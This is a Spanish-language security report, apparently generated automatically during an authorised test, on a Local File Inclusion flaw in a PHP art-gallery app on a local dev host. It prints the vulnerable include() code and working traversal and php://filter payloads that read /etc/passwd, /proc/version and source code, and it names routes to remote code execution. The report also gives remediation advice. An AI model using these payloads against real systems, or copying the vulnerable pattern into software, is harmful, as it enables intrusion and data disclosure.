# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:10:29  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Resultado:** VULNERABILIDAD CONFIRMADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor, incluyendo archivos sensibles como `/etc/passwd`.

**Severidad:** 🔴 **CRÍTICA**

---

## 2. Descripción de la Aplicación

La aplicación es una galería de arte virtual con las siguientes páginas:
- `gallery.php?page=modern` - Arte Moderno
- `gallery.php?page=classic` - Arte Clásico
- `gallery.php?page=abstract` - Arte Abstracto
- `gallery.php?page=about` - Acerca de

---

## 3. Vulnerabilidad Identificada

### 3.1 Local File Inclusion (LFI)

**Parámetro vulnerable:** `page` en `gallery.php`  
**URL vulnerable:** `http://web.dev.local:8081/gallery.php?page=<payload>`

#### Código fuente vulnerable (obtenido vía PHP filter wrapper):

```php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
```

**Causa raíz:** El parámetro `page` se usa directamente en la función `include()` sin ninguna sanitización ni validación de rutas. Cuando el parámetro contiene un punto (`.`), el valor se utiliza directamente como ruta de archivo, lo que permite el uso de secuencias de traversal de directorios (`../`).

---

## 4. Explotación

### 4.1 Lectura de /etc/passwd (Path Traversal)

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Lectura de información del kernel via /proc/version

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../proc/version
```

**Resultado:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

### 4.3 Lectura del código fuente de la aplicación via PHP Filter Wrapper

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
```

**Resultado:** Código fuente completo de `gallery.php` en base64 (decodificado y mostrado en sección 3.1).

---

## 5. Vectores de Ataque Detectados

| # | Payload | Resultado |
|---|---------|-----------|
| 1 | `../../../etc/passwd` | ✅ Explotado - Contenido revelado |
| 2 | `/etc/passwd` (ruta absoluta) | ❌ No funciona (sin punto en la ruta básica) |
| 3 | `file:///etc/passwd` | ❌ No funciona |
| 4 | `../../../proc/version` | ✅ Explotado - Info del kernel revelada |
| 5 | `php://filter/convert.base64-encode/resource=gallery.php` | ✅ Explotado - Código fuente revelado |

---

## 6. Impacto

- **Divulgación de información sensible:** Lectura de archivos del sistema como `/etc/passwd`, configuraciones, logs, etc.
- **Exposición del código fuente:** Lectura de archivos PHP de la aplicación.
- **Escalada potencial a RCE:** Combinando LFI con log poisoning o wrappers PHP (como `php://input`, `data://`) podría lograrse ejecución remota de código.
- **Reconocimiento del sistema:** Lectura de `/proc/version`, `/proc/self/environ`, etc., permite identificar el sistema operativo y entorno.

---

## 7. Recomendaciones

1. **Validar y sanitizar el parámetro `page`:** Usar una lista blanca (whitelist) de páginas permitidas.
2. **No usar entrada del usuario directamente en `include()`:** Mapear los parámetros a rutas internas fijas.
3. **Deshabilitar wrappers PHP peligrosos:** Configurar `allow_url_include = Off` y restringir `allow_url_fopen`.
4. **Usar `realpath()` y verificar prefijos:** Asegurar que la ruta resuelta comience dentro del directorio web raíz.
5. **Implementar controles de acceso a archivos:** Reducir los permisos del proceso web al mínimo necesario.

**Ejemplo de código seguro:**
```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // fallback seguro
}

include("pages/" . $page . ".php");
```

---

## 8. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de LFI en el parámetro `page` de `gallery.php`. Esta vulnerabilidad fue explotada exitosamente para leer archivos sensibles del sistema (`/etc/passwd`, `/proc/version`) y el código fuente de la propia aplicación. Se recomienda corrección inmediata siguiendo las recomendaciones indicadas.

---

*Informe generado automáticamente durante análisis de seguridad autorizado.*
